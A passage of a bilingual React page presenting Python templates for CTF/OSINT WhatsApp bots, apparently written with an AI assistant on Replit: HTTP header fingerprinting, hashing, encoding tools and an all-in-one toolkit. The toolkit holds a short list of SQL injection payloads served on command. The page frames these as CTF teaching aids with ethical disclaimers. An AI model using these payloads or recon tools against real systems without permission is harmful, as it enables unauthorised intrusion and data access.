        "apache": "Apache", "nginx": "Nginx", "iis": "IIS (Microsoft)",
        "cloudflare": "Cloudflare", "litespeed": "LiteSpeed",
    },
    "x-powered-by": {
        "php": "PHP", "asp.net": "ASP.NET", "express": "Express.js",
        "next.js": "Next.js", "django": "Django",
    },
}

SECURITY_HEADERS = [
    "Strict-Transport-Security", "X-Content-Type-Options",
    "X-Frame-Options", "Content-Security-Policy",
    "X-XSS-Protection", "Referrer-Policy",
]


def analyze_headers(url: str) -> str:
    """Analiza cabeceras HTTP de una URL."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    try:
        r = requests.get(url, timeout=10, allow_redirects=True, headers={"User-Agent": "CTF-Bot/1.0"})
        lines = [f"Headers de {url} [HTTP {r.status_code}]\\n"]

        # Tecnología detectada
        tech_found = []
        for header, sigs in TECH_SIGNATURES.items():
            val = r.headers.get(header, "").lower()
            for sig, name in sigs.items():
                if sig in val:
                    tech_found.append(name)
        if tech_found:
            lines.append(f"Tecnología: {', '.join(tech_found)}")

        # Cabeceras de seguridad presentes/ausentes
        lines.append("\\nSeguridad:")
        for h in SECURITY_HEADERS:
            val = r.headers.get(h)
            lines.append(f"  {'OK' if val else 'NO'}  {h}")

        # Cabeceras crudas relevantes
        important = ["Server", "X-Powered-By", "X-Generator", "Via", "X-Cache"]
        lines.append("\\nCabeceras:")
        for h in important:
            if h in r.headers:
                lines.append(f"  {h}: {r.headers[h][:60]}")

        return "\\n".join(lines)
    except Exception as e:
        logger.error(f"headers error: {e}")
        return f"Error analizando {url}: {e}"


@app.route("/whatsapp", methods=["POST"])
def webhook():
    body = request.values.get("Body", "").strip().lower()
    resp = MessagingResponse()
    msg = resp.message()
    parts = body.split(" ", 1)
    cmd, arg = parts[0], parts[1] if len(parts) > 1 else ""

    if cmd in ("menu", "inicio"):
        msg.body("headers <url>  — Analizar cabeceras HTTP\\n⚠️ Solo uso autorizado.")
    elif cmd == "headers" and arg:
        logger.info(f"Headers: {arg}")
        msg.body(analyze_headers(arg)[:1600])
    else:
        msg.body("Enviá 'menu' para ver comandos.")
    return str(resp)


def main():
    logger.info(f"Bot Headers/Tech iniciado en puerto {PORT}...")
    app.run(host="0.0.0.0", port=PORT, debug=False)


if __name__ == "__main__":
    main()
`;

const WA_03 = `# bots/ctf/wa_03_hash_suite.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
# ─────────────────────────────────────────────────────────────
# PROPÓSITO: Bot WhatsApp — Hash Suite (generar + identificar)
# Ejecución: python bots/ctf/wa_03_hash_suite.py
#         o: python -m bots.ctf.wa_03_hash_suite
# ─────────────────────────────────────────────────────────────

import hashlib
import re
from flask import Flask, request
from twilio.twiml.messaging_response import MessagingResponse
from bots.shared.env import get_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
PORT = int(get_env("PORT", "5000"))
app = Flask(__name__)


def all_hashes(text: str) -> str:
    encoded = text.encode("utf-8")
    return (
        f"MD5:      {hashlib.md5(encoded).hexdigest()}\\n"
        f"SHA1:     {hashlib.sha1(encoded).hexdigest()}\\n"
        f"SHA256:   {hashlib.sha256(encoded).hexdigest()}\\n"
        f"SHA512:   {hashlib.sha512(encoded).hexdigest()[:40]}..."
    )


def identify_hash(h: str) -> str:
    h = h.strip()
    if not re.match(r'^[a-fA-F0-9]+$', h):
        return "No parece un hash hexadecimal"
    length_map = {32: "MD5", 40: "SHA-1", 64: "SHA-256", 128: "SHA-512"}
    return length_map.get(len(h), f"Desconocido ({len(h)} chars)")


@app.route("/whatsapp", methods=["POST"])
def webhook():
    body = request.values.get("Body", "").strip()
    resp = MessagingResponse()
    msg = resp.message()
    parts = body.lower().split(" ", 1)
    cmd, arg = parts[0], (body.split(" ", 1)[1] if len(parts) > 1 else "")

    if cmd in ("menu", "inicio"):
        msg.body(
            "Hash Suite — WhatsApp\\n\\n"
            "hash <texto>     — Todos los hashes\\n"
            "identify <hash>  — Identificar tipo\\n\\n"
            "⚠️ Solo uso educativo y CTF."
        )
    elif cmd == "hash" and arg:
        msg.body(f"Hashes de: {arg[:30]}\\n\\n{all_hashes(arg)}")
    elif cmd == "identify" and arg:
        tipo = identify_hash(arg)
        msg.body(f"Hash: {arg[:30]}...\\nTipo: {tipo}")
    else:
        msg.body("Enviá 'menu' para ver comandos.")
    return str(resp)


def main():
    logger.info(f"Bot Hash Suite WhatsApp iniciado en puerto {PORT}...")
    app.run(host="0.0.0.0", port=PORT, debug=False)


if __name__ == "__main__":
    main()
`;

const WA_04 = `# bots/ctf/wa_04_encoding.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
# ─────────────────────────────────────────────────────────────
# PROPÓSITO: Bot WhatsApp — Encoding Toolkit (b64, hex, ROT13, URL)
# Ejecución: python bots/ctf/wa_04_encoding.py
#         o: python -m bots.ctf.wa_04_encoding
# IDEA FUTURA: agregar soporte para Atbash, Vigenere, Caesar con clave
# ─────────────────────────────────────────────────────────────

import base64
import codecs
import urllib.parse
from flask import Flask, request
from twilio.twiml.messaging_response import MessagingResponse
from bots.shared.env import get_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
PORT = int(get_env("PORT", "5000"))
app = Flask(__name__)

MENU = (
    "Encoding Toolkit — WhatsApp\\n\\n"
    "b64enc <texto>   — Base64 encode\\n"
    "b64dec <texto>   — Base64 decode\\n"
    "hex <texto>      — Texto a HEX\\n"
    "unhex <hex>      — HEX a texto\\n"
    "rot13 <texto>    — ROT13\\n"
    "url <texto>      — URL encode\\n"
    "unurl <texto>    — URL decode\\n\\n"
    "⚠️ Solo uso educativo."
)


def route_cmd(cmd: str, arg: str) -> str:
    """Router de comandos. MODIFICAR: agregar más operaciones aquí."""
    try:
        if cmd == "b64enc":
            return f"Base64:\\n{base64.b64encode(arg.encode()).decode()}"
        elif cmd == "b64dec":
            return f"Decodificado:\\n{base64.b64decode(arg).decode('utf-8', errors='replace')}"
        elif cmd == "hex":
            return f"HEX:\\n{arg.encode().hex()}"
        elif cmd == "unhex":
            return f"Texto:\\n{bytes.fromhex(arg).decode('utf-8', errors='replace')}"
        elif cmd == "rot13":
            return f"ROT13:\\n{codecs.encode(arg, 'rot_13')}"
        elif cmd == "url":
            return f"URL encoded:\\n{urllib.parse.quote(arg)}"
        elif cmd == "unurl":
            return f"URL decoded:\\n{urllib.parse.unquote(arg)}"
        else:
            return "Comando no reconocido. Enviá 'menu' para ver opciones."
    except Exception as e:
        return f"Error: {e}"


@app.route("/whatsapp", methods=["POST"])
def webhook():
    body = request.values.get("Body", "").strip()
    resp = MessagingResponse()
    msg = resp.message()
    parts = body.split(" ", 1)
    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if cmd in ("menu", "inicio"):
        msg.body(MENU)
    elif arg:
        msg.body(route_cmd(cmd, arg)[:1600])
    else:
        msg.body("Enviá 'menu' para ver comandos, o el comando seguido del texto.")
    return str(resp)


def main():
    logger.info(f"Bot Encoding WhatsApp iniciado en puerto {PORT}...")
    app.run(host="0.0.0.0", port=PORT, debug=False)


if __name__ == "__main__":
    main()
`;

const WA_05 = `# bots/ctf/wa_05_ctf_toolkit.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
# ─────────────────────────────────────────────────────────────
# PROPÓSITO: Bot WhatsApp — CTF Toolkit completo all-in-one
#   IP, Hash, Encoding, SQLi payloads en un solo bot
# Ejecución: python bots/ctf/wa_05_ctf_toolkit.py
#         o: python -m bots.ctf.wa_05_ctf_toolkit
# IDEA FUTURA: sistema de "sessions" para recordar contexto por usuario
# IDEA FUTURA: modo competencia con timer para CTF timed challenges
# ─────────────────────────────────────────────────────────────

import base64
import hashlib
import codecs
import urllib.parse
import requests
from flask import Flask, request
from twilio.twiml.messaging_response import MessagingResponse
from bots.shared.env import get_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
PORT = int(get_env("PORT", "5000"))
app = Flask(__name__)

DISCLAIMER = "⚠️ Solo CTF y entornos con permiso explícito del propietario."

# MODIFICAR: activá o desactivá secciones según lo que necesite tu CTF
ENABLED_MODULES = {
    "ip": True,       # GeoIP lookup
    "hash": True,     # Hash suite
    "encode": True,   # Encoding tools
    "sqli": True,     # SQLi payloads
}

SQLI_QUICK = [
    "' OR 1=1--",
    "' OR '1'='1",
    "admin'--",
    "' UNION SELECT NULL,NULL--",
    "' AND SLEEP(5)--",
]

MENU = """CTF Toolkit All-in-One — WhatsApp

OSINT:
  ip <target>        — GeoIP lookup

HASH:
  hash <texto>       — Todos los hashes
  identify <hash>    — Identificar tipo

ENCODING:
  b64enc / b64dec <texto>
  hex / unhex <texto>
  rot13 <texto>

CTF:
  sqli               — SQLi payloads rápidos
  analyze <texto>    — Auto-análisis encoding

""" + DISCLAIMER


def process(cmd: str, arg: str) -> str:
    """Procesa todos los comandos del toolkit. MODIFICAR: añadir módulos extras."""
    # OSINT
    if cmd == "ip" and arg and ENABLED_MODULES["ip"]:
        try:
            r = requests.get(f"http://ip-api.com/json/{arg}?fields=status,country,city,isp,query", timeout=8)
            d = r.json()
            if d.get("status") == "success":
                return f"IP: {d['query']}\\nPaís: {d['country']}\\nCiudad: {d['city']}\\nISP: {d['isp']}"
            return f"Error: {d.get('message', 'sin respuesta')}"
        except Exception as e:
            return f"Error IP: {e}"

    # Hash
    if cmd == "hash" and arg and ENABLED_MODULES["hash"]:
        enc = arg.encode()
        return (f"MD5:    {hashlib.md5(enc).hexdigest()}\\n"
                f"SHA1:   {hashlib.sha1(enc).hexdigest()}\\n"
                f"SHA256: {hashlib.sha256(enc).hexdigest()}")

    if cmd == "identify" and arg and ENABLED_MODULES["hash"]:
        clean = arg.strip()
        if not all(c in "0123456789abcdefABCDEF" for c in clean):
            return "No parece un hash hexadecimal"
        length_map = {32: "MD5", 40: "SHA-1", 64: "SHA-256", 128: "SHA-512"}
        return f"Tipo probable: {length_map.get(len(clean), f'Desconocido ({len(clean)} chars)')}"

    # Encoding
    if ENABLED_MODULES["encode"]:
        try:
            if cmd == "b64enc" and arg:
                return f"Base64: {base64.b64encode(arg.encode()).decode()}"
            if cmd == "b64dec" and arg:
                return f"Decoded: {base64.b64decode(arg).decode('utf-8', errors='replace')}"
            if cmd == "hex" and arg:
                return f"HEX: {arg.encode().hex()}"
            if cmd == "unhex" and arg:
                return f"Texto: {bytes.fromhex(arg).decode('utf-8', errors='replace')}"
            if cmd == "rot13" and arg:
                return f"ROT13: {codecs.encode(arg, 'rot_13')}"
        except Exception as e:
            return f"Error encoding: {e}"

    # CTF
    if cmd == "sqli" and ENABLED_MODULES["sqli"]:
        return "SQLi Payloads rápidos:\\n" + "\\n".join(f"{i+1}. {p}" for i, p in enumerate(SQLI_QUICK)) + f"\\n\\n{DISCLAIMER}"

    if cmd == "analyze" and arg:
        hints = []
        if len(arg) % 4 == 0 and all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in arg):
            hints.append("Probable Base64")
        if all(c in "0123456789abcdefABCDEF" for c in arg):
            hints.append(f"Probable HEX ({len(arg)} chars)")
        if "." in arg and arg.count(".") == 2:
            hints.append("Posible JWT")
        return "Análisis:\\n" + ("\\n".join(hints) if hints else "Formato no identificado")

    return "Comando no reconocido. Enviá 'menu' para ver opciones."


@app.route("/whatsapp", methods=["POST"])
def webhook():
    body = request.values.get("Body", "").strip()
    resp = MessagingResponse()
    msg = resp.message()
    parts = body.split(" ", 1)
    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if cmd in ("menu", "inicio", "start", "hola"):
        msg.body(MENU)
    else:
        result = process(cmd, arg)
        msg.body(result[:1600])
    return str(resp)


def main():
    logger.info(f"CTF Toolkit All-in-One WhatsApp iniciado en puerto {PORT}...")
    app.run(host="0.0.0.0", port=PORT, debug=False)


if __name__ == "__main__":
    main()
`;

// ─────────────────────────────────────────────────────────────────────────────
// COMPONENTES UI
// ─────────────────────────────────────────────────────────────────────────────

function DisclaimerBanner({ lang }: { lang: string }) {
  return (
    <div className="flex gap-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg p-4 mb-6">
      <ShieldAlert className="h-5 w-5 text-yellow-500 flex-shrink-0 mt-0.5" />
      <div className="text-sm">
        <p className="font-semibold text-yellow-600 dark:text-yellow-400 mb-1">
          {M(lang, "Disclaimer Ético — incluido en cada archivo", "Ethical Disclaimer — included in each file")}
        </p>
        <p className="text-muted-foreground">
          {M(lang,
            "Cada plantilla lleva el disclaimer de uso ético directamente en el encabezado del archivo Python. Las herramientas son para CTF, investigación y auditorías en entornos con permiso explícito.",
            "Each template carries the ethical use disclaimer directly in the Python file header. Tools are for CTF, research and audits in environments with explicit permission."
          )}
        </p>
      </div>
    </div>
  );
}

function ConventionBadges({ lang }: { lang: string }) {
  const badges = [
    { label: "bots.shared.env", desc: M(lang, "require_env() — sin hardcode jamás", "require_env() — never hardcode") },
    { label: "bots.shared.logger", desc: M(lang, "get_logger(__name__) — logs consistentes", "get_logger(__name__) — consistent logs") },
    { label: "# MODIFICAR:", desc: M(lang, "Comentarios en español", "Comments in Spanish") },
    { label: "dual-execution", desc: M(lang, "python bots/... o python -m bots...", "python bots/... or python -m bots...") },
  ];
  return (
    <div className="flex flex-wrap gap-2 mb-6">
      {badges.map((b, i) => (
        <div key={i} className="border border-primary/20 bg-primary/5 rounded-md px-3 py-1.5">
          <code className="text-xs text-primary font-mono">{b.label}</code>
          <p className="text-xs text-muted-foreground mt-0.5">{b.desc}</p>
        </div>
      ))}
    </div>
  );
}

function TemplateCard({
  filename, description, code, lang
}: {
  filename: string; description: string; code: string; lang: string
}) {
  return (
    <div className="border border-border rounded-lg overflow-hidden mb-6">
      <div className="flex items-center justify-between px-4 py-3 bg-muted/40 border-b border-border">
        <div>
          <code className="text-sm font-mono text-primary">{filename}</code>
          <p className="text-xs text-muted-foreground mt-0.5">{description}</p>
        </div>
      </div>
      <div className="p-4">
        <CodeBlock code={code} language="python" filename={filename} />
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// PÁGINA PRINCIPAL
// ─────────────────────────────────────────────────────────────────────────────

export default function CtfTemplates() {
  const { lang } = useLanguage();

  const tgTemplates = [
    { filename: "bots/ctf/tg_01_ip_geo_whois.py", code: TG_01, description: M(lang, "IP Lookup + GeoIP + WHOIS completo", "Full IP Lookup + GeoIP + WHOIS") },
    { filename: "bots/ctf/tg_02_dns_recon.py",    code: TG_02, description: M(lang, "DNS Recon (A, MX, NS, TXT, CNAME, SOA)", "DNS Recon (A, MX, NS, TXT, CNAME, SOA)") },
    { filename: "bots/ctf/tg_03_hash_suite.py",   code: TG_03, description: M(lang, "Generar + identificar hashes MD5/SHA/SHA3", "Generate + identify MD5/SHA/SHA3 hashes") },
    { filename: "bots/ctf/tg_04_encoding_knife.py",code: TG_04, description: M(lang, "b64, hex, ROT13, URL, JWT, Morse, Binario", "b64, hex, ROT13, URL, JWT, Morse, Binary") },
    { filename: "bots/ctf/tg_05_sqli_builder.py", code: TG_05, description: M(lang, "SQL Injection payloads por técnica con botones inline", "SQL Injection payloads by technique with inline buttons") },
  ];

  const waTemplates = [
    { filename: "bots/ctf/wa_01_ip_geo.py",       code: WA_01, description: M(lang, "IP Lookup + GeoIP (Flask + Twilio)", "IP Lookup + GeoIP (Flask + Twilio)") },
    { filename: "bots/ctf/wa_02_headers_tech.py", code: WA_02, description: M(lang, "HTTP Headers Inspector + Tech Fingerprinting", "HTTP Headers Inspector + Tech Fingerprinting") },
    { filename: "bots/ctf/wa_03_hash_suite.py",   code: WA_03, description: M(lang, "Hash Suite completo para WhatsApp", "Complete Hash Suite for WhatsApp") },
    { filename: "bots/ctf/wa_04_encoding.py",     code: WA_04, description: M(lang, "Encoding Toolkit (b64, hex, ROT13, URL)", "Encoding Toolkit (b64, hex, ROT13, URL)") },
    { filename: "bots/ctf/wa_05_ctf_toolkit.py",  code: WA_05, description: M(lang, "CTF Toolkit all-in-one (todos los módulos)", "CTF all-in-one Toolkit (all modules)") },
  ];

  const sharedModules = [
    { filename: "bots/__init__.py",       code: BOTS_INIT_PY,  description: M(lang, "Paquete raíz requerido para imports", "Root package required for imports") },
    { filename: "bots/shared/__init__.py",code: SHARED_INIT_PY, description: M(lang, "Paquete shared requerido", "Required shared package") },
    { filename: "bots/shared/env.py",     code: SHARED_ENV_PY, description: M(lang, "require_env() y get_env() — nunca hardcodees claves", "require_env() and get_env() — never hardcode keys") },
    { filename: "bots/shared/logger.py",  code: SHARED_LOGGER_PY, description: M(lang, "get_logger(__name__) — logging consistente", "get_logger(__name__) — consistent logging") },
  ];

  return (
    <Layout>
      {/* Header */}
      <div className="mb-8">
        <div className="flex items-center gap-3 mb-3">
          <div className="p-2 rounded-lg bg-red-500/10">
            <ShieldAlert className="h-6 w-6 text-red-400" />
          </div>
          <div>
            <h1 className="text-3xl font-bold tracking-tight">
              {M(lang, "Fase 4 — Plantillas CTF/OSINT", "Phase 4 — CTF/OSINT Templates")}
            </h1>
            <p className="text-xs text-muted-foreground mt-0.5">
              {M(lang, "10 plantillas · Convenciones de Fase 2 · Disclaimer ético incluido", "10 templates · Phase 2 conventions · Ethical disclaimer included")}
            </p>
          </div>
        </div>
        <p className="text-muted-foreground text-lg">
          {M(lang,
            "5 bots para Telegram + 5 para WhatsApp siguiendo las convenciones establecidas. Estructura de paquete bots/ con módulos compartidos.",
            "5 bots for Telegram + 5 for WhatsApp following established conventions. bots/ package structure with shared modules."
          )}
        </p>
      </div>

      <ConventionBadges lang={lang} />
      <DisclaimerBanner lang={lang} />

      {/* Estructura de carpetas */}
      <div className="border border-border rounded-lg p-5 mb-8 bg-muted/20">
        <p className="text-sm font-semibold mb-3 flex items-center gap-2">
          <Share2 className="h-4 w-4 text-primary" />
          {M(lang, "Estructura de carpetas requerida", "Required folder structure")}
        </p>
        <CodeBlock
          code={`bots/
├── __init__.py              # paquete raíz
├── shared/
│   ├── __init__.py          # paquete shared
│   ├── env.py               # require_env(), get_env()
│   └── logger.py            # get_logger(__name__)
└── ctf/
    ├── tg_01_ip_geo_whois.py
    ├── tg_02_dns_recon.py
    ├── tg_03_hash_suite.py
    ├── tg_04_encoding_knife.py
    ├── tg_05_sqli_builder.py
    ├── wa_01_ip_geo.py
    ├── wa_02_headers_tech.py
    ├── wa_03_hash_suite.py
    ├── wa_04_encoding.py
    └── wa_05_ctf_toolkit.py`}
          language="bash"
          filename="estructura.txt"
        />
      </div>

      {/* Tabs con plantillas */}
      <Tabs defaultValue="shared">
        <TabsList className="mb-6 flex-wrap h-auto gap-1">
          <TabsTrigger value="shared" className="flex items-center gap-1.5">
            <Share2 className="h-3.5 w-3.5" />
            {M(lang, "Módulos Compartidos", "Shared Modules")}
          </TabsTrigger>
          <TabsTrigger value="telegram" className="flex items-center gap-1.5">
            <Bot className="h-3.5 w-3.5" />
            {M(lang, "Telegram (5)", "Telegram (5)")}
          </TabsTrigger>
          <TabsTrigger value="whatsapp" className="flex items-center gap-1.5">
            <MessageSquare className="h-3.5 w-3.5" />
            {M(lang, "WhatsApp (5)", "WhatsApp (5)")}
          </TabsTrigger>
        </TabsList>

        <TabsContent value="shared">
          <p className="text-sm text-muted-foreground mb-6">
            {M(lang,
              "Creá estos archivos primero. Todos los bots de Fase 4 los importan. Sin ellos el código no corre.",
              "Create these files first. All Phase 4 bots import them. Without them the code won't run."
            )}
          </p>
          {sharedModules.map(t => (
            <TemplateCard key={t.filename} lang={lang} {...t} />
          ))}
        </TabsContent>

        <TabsContent value="telegram">
          <p className="text-sm text-muted-foreground mb-6">
            {M(lang,
              "5 bots Telegram CTF/OSINT. Requieren python-telegram-bot v20+, dnspython, python-whois, requests.",
              "5 Telegram CTF/OSINT bots. Require python-telegram-bot v20+, dnspython, python-whois, requests."
            )}
          </p>
          {tgTemplates.map(t => (
            <TemplateCard key={t.filename} lang={lang} {...t} />
          ))}
        </TabsContent>

        <TabsContent value="whatsapp">
          <p className="text-sm text-muted-foreground mb-6">
            {M(lang,
              "5 bots WhatsApp CTF/OSINT. Requieren Flask, twilio, requests. Configurá el webhook en Twilio Sandbox.",
              "5 WhatsApp CTF/OSINT bots. Require Flask, twilio, requests. Configure webhook in Twilio Sandbox."
            )}
          </p>
          {waTemplates.map(t => (
            <TemplateCard key={t.filename} lang={lang} {...t} />
          ))}
        </TabsContent>
      </Tabs>
    </Layout>
  );
}
